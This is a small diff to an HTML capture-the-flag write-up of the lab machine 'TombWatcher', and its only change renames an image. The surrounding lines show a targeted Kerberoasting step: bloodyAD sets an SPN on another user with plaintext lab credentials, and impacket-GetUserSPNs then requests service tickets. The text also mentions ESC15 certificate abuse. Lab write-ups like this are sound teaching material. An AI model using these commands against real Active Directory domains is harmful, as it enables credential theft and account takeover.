@@ -86,7 +86,7 @@ I exploited ESC15 by requesting a certificate for the Administrator account with
 <p>I can add an SPN value to Alfred's attribute using bloodyAD.</p>
 <p><code>bloodyAD -u henry -p 'H3nry_987TGV!' -d TombWatcher.htb --dc-ip 10.10.11.72 set object -v whatever/name Alfred servicePrincipalName</code></p>
 <p>The value itself does not matter here and can be set to anything. It just needs to be set in order to be considered valid for Kerberos requests.</p>
-<p><img alt="updated" src="../images/TombWatcher/updated.png" /></p>
+<p><img alt="update" src="../images/TombWatcher/update.png" /></p>
 <p>Now I can use impacket's GetUserSPNs to seek all users with an SPN set, and request a TGS(ticket granting service) for each user found.</p>
 <p><code>impacket-GetUserSPNs -request -dc-ip 10.10.11.72 TombWatcher.htb/Henry:'H3nry_987TGV!'</code></p>
 <p><img alt="ticket" src="../images/TombWatcher/ticket.png" /></p>
